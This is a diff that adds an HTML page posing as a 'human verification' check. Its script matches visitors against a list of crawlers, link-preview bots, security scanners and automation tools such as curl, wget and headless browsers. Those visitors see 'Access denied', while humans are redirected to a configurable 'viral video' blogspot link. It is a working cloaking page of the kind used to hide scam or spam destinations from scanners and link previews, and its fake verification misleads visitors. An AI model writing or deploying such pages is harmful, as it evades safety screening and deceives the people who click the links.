@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Link Verification — Human Check</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="robots" content="noindex, nofollow" />
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #f8fafc;
+      color: #0f172a;
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+      padding: 1rem;
+    }
+    .card {
+      width: 100%;
+      max-width: 26rem;
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 1rem;
+      padding: 2rem;
+      box-shadow: 0 10px 25px rgba(15, 23, 42, 0.08);
+      text-align: center;
+    }
+    .spinner {
+      width: 3rem;
+      height: 3rem;
+      margin: 0 auto 1rem;
+      border: 4px solid rgba(15, 23, 42, 0.15);
+      border-top-color: #1e293b;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h1 { font-size: 1.5rem; font-weight: 600; margin: 0 0 0.75rem; }
+    p.sub { font-size: 0.875rem; color: #64748b; margin: 0; }
+    button {
+      margin-top: 1.5rem;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: #1e293b;
+      color: #f8fafc;
+      border: none;
+      border-radius: 0.5rem;
+      padding: 0.625rem 1.25rem;
+      font-size: 0.875rem;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+    }
+    button:hover { background: #334155; }
+    .footer { margin-top: 1.5rem; font-size: 0.75rem; color: #94a3b8; }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="spinner" id="spinner"></div>
+    <h1 id="title">Verifying your request…</h1>
+    <p class="sub" id="message">Please wait a moment while we make sure you're human.</p>
+    <button id="continueBtn" class="hidden">Continue now</button>
+    <p class="footer">Protected link · Human verification required</p>
+  </div>
+
+  <script>
+    // ============================================================
+    //  CONFIGURATION — change this to your destination link
+    // ============================================================
+    var TARGET_URL = "https://viralvideoreels12.blogspot.com/2026/09/eeds.html?m=1";
+    var COUNTDOWN_SECONDS = 3;
+
+    // ============================================================
+    //  BOT DETECTION
+    // ============================================================
+    var BOT_PATTERNS = [
+      /bot/i, /crawl/i, /spider/i, /slurp/i, /facebookexternalhit/i, /whatsapp/i,
+      /telegrambot/i, /discordbot/i, /twitterbot/i, /linkedinbot/i, /embedly/i,
+      /quora/i, /pinterest/i, /vkshare/i, /skype/i, /googleimageproxy/i,
+      /bitlybot/i, /previewbot/i, /headlesschrome/i, /phantomjs/i, /puppeteer/i,
+      /playwright/i, /selenium/i, /http-client/i, /curl/i, /wget/i, /python-requests/i,
+      /axios/i, /go-http/i, /okhttp/i, /java\//i, /node-fetch/i, /monitoring/i,
+      /pingdom/i, /uptimerobot/i, /lighthouse/i, /pagespeed/i, /gtmetrix/i,
+      /ahrefs/i, /semrush/i, /mj12/i, /dotbot/i
+    ];
+
+    function detectBot() {
+      if (typeof navigator === "undefined") return true;
+      var ua = navigator.userAgent || "";
+      if (!ua) return true;
+      for (var i = 0; i < BOT_PATTERNS.length; i++) {
+        if (BOT_PATTERNS[i].test(ua)) return true;
+      }
+      if (navigator.webdriver) return true;
+      if (!navigator.languages || navigator.languages.length === 0) return true;
+      if (window.callPhantom || window._phantom || window.phantom) return true;
+      if (window.__nightmare) return true;
+      if (window.domAutomation || window.domAutomationController) return true;
+      return false;
+    }
+
+    // ============================================================
+    //  PAGE LOGIC
+    // ============================================================
+    var spinner = document.getElementById("spinner");
+    var title = document.getElementById("title");
+    var message = document.getElementById("message");
+    var continueBtn = document.getElementById("continueBtn");
+    var interacted = false;
+
+    function goToTarget() {
+      window.location.replace(TARGET_URL);
+    }
+
+    setTimeout(function () {
+      if (detectBot()) {
+        // --- BOT: show access denied, never redirect ---
+        spinner.classList.add("hidden");
+        title.textContent = "Access denied";
+        message.textContent = "Automated access is blocked. This link is for human visitors only.";
+        return;
+      }
+
+      // --- HUMAN: wait for a real interaction signal ---
+      function onInteract() { interacted = true; }
+      window.addEventListener("mousemove", onInteract, { once: true });
+      window.addEventListener("touchstart", onInteract, { once: true });
+      window.addEventListener("scroll", onInteract, { once: true });
+
+      spinner.classList.add("hidden");
+      title.textContent = "Verification complete";
+      message.textContent = "Move your mouse or tap the screen to continue.";
+      continueBtn.classList.remove("hidden");
+      continueBtn.addEventListener("click", goToTarget);
+
+      // Countdown auto-redirect (only starts after interaction)
+      var remaining = COUNTDOWN_SECONDS;
+      var timer = setInterval(function () {
+        if (!interacted) return;
+        if (remaining <= 0) {
+          clearInterval(timer);
+          goToTarget();
+          return;
+        }
+        message.textContent = "Redirecting in " + remaining + "s…";
+        remaining--;
+      }, 1000);
+    }, 400);
+  </script>
+</body>
+</html>
